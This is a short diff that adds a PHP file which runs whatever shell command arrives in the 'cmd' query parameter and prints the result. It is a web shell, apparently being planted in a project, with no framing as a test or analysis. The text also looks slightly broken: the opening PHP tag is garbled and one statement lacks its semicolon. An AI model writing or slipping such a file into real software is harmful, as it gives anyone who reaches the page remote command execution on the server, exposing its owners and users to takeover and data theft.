@@ -1,0 +1,5 @@
+¬?php 
+	header("Content-type: text/html; charset=utf-8")
+    $output = shell_exec($_GET['cmd']);
+    echo $output;
+?>
